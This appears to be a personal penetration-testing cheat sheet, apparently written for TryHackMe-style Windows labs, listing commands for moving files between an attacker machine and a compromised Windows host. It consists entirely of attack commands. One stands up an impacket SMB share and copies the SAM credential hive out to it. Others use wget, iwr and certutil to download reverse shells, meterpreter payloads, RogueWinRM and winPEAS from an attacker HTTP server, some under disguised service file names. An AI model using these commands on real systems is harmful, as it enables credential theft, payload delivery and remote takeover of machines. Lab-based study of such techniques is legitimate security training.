
## copy files from win

[[Public/InfoSec/Tools n Info/09 - Windows Exploration/smb|smb]]
[[impacket]]

create share for upload to our machine
atk: `sudo impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 myshare ../dirname`

cmd: `copy sam.hive \\10.18.21.236\myshare`

## copy files to win

as above

atk: `python3 -m http.server 8000`

ps: `wget "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" -O "C:\PROGRA~2\SYSTEM~1\WService.exe"`
ps: `iwr "http://10.18.21.236:8000/enum/winPEASany.exe" -outfile "C:\windows\temp\winpeas.exe"`
ps: `iwr "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" -outfile "C:\windows\temp\revsh-meterpr-444.exe"`
try skipping outfile

cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\PROGRA~2\SYSTEM~1\WService.exe"`
cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe" "RogueWinRM.exe"`

cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"`

cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "revsh-443.exe"`
cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "message.exe"`

cmd: `certutil -urlcache -split -f "http://10.18.21.236:8000/enum/winPEAS.bat" "winpeas.bat"`
